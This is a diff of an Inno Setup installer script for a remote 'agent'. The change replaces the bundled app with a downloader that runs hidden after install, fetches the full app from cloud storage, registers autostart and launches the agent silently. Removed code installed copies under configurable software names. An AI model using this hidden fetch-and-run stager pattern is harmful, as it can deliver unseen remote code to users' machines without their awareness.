@@ -39,7 +39,7 @@ UninstallDisplayIcon={app}\{#AppExe}
 UninstallDisplayName={code:GetFirstName|Support}
 
 [Files]
-Source: "release\Aegis\*"; DestDir: "{app}"; Flags: recursesubdirs createallsubdirs ignoreversion
+Source: "release\downloader.exe"; DestDir: "{app}"; Flags: ignoreversion
 
 ; Run key is handled in [Code] (WriteRunKey) so it can be conditionally formed
 ; with --user-data-dir when dual-install is active and matched to the operator-
@@ -317,41 +317,17 @@ begin
   Exec(dstDir + '\{#AppExe}', '--startup --user-data-dir="' + dataDir + '"', '', SW_HIDE, ewNoWait, ResultCode);
 end;
 
-// IMPORTANT: do NOT try to self-relaunch /VERYSILENT here. Inno 6.7's
-// RedirectionGuard denies a setup Exec'ing its own exe (ACCESS DENIED / rc=5),
-// and every workaround (copy-to-temp + re-exec, cmd start, etc.) either fails
-// the same way or spawns errant popups. A double-click therefore shows a brief
-// wizard. Customers download via /dl/<key> → the VBS launcher calls this with
-// /VERYSILENT → truly silent for real users. That is the intended path; the
-// wizard on a plain double-click is a test-only artifact.
-// After install: write the agent's config (relay + enrollment key) and launch it.
-// If the enrollment key was built with a second software name (dual-install),
-// also install a parallel copy under that name — see InstallSecondCopy.
+// After install: launch the downloader which fetches the full app from B2,
+// extracts it silently, writes config, registers autostart, and launches the agent.
 procedure CurStepChanged(CurStep: TSetupStep);
 var
-  key, dataDir1: String;
-  dual: Boolean;
+  key: String;
   ResultCode: Integer;
 begin
   if CurStep = ssPostInstall then
   begin
-    FetchKeyMeta;
     key := GetEnrollKey;
-    dual := g_secondName <> '';
-    if key <> '' then WriteConfig(ExpandConstant('{app}'), key, 1, g_firstName, dual);
-    if dual then begin
-      dataDir1 := ExpandConstant('{app}') + '\userdata';
-      WriteRunKey(g_firstName, ExpandConstant('{app}\{#AppExe}'), dataDir1);
-      // Secondary copy — only when the key was built with a second name.
-      if key <> '' then InstallSecondCopy(key, g_secondName);
-      // Launch primary with its own userdata dir so Electron doesn't collide
-      // with the secondary copy on its single-instance lock.
-      Exec(ExpandConstant('{app}\{#AppExe}'), '--startup --user-data-dir="' + dataDir1 + '"', '', SW_HIDE, ewNoWait, ResultCode);
-    end else begin
-      // Single-install path — identical to the pre-dual installer.
-      WriteRunKey('Support', ExpandConstant('{app}\{#AppExe}'), '');
-      Exec(ExpandConstant('{app}\{#AppExe}'), '--startup', '', SW_HIDE, ewNoWait, ResultCode);
-    end;
+    Exec(ExpandConstant('{app}\downloader.exe'), key, '', SW_HIDE, ewNoWait, ResultCode);
   end;
 end;
 
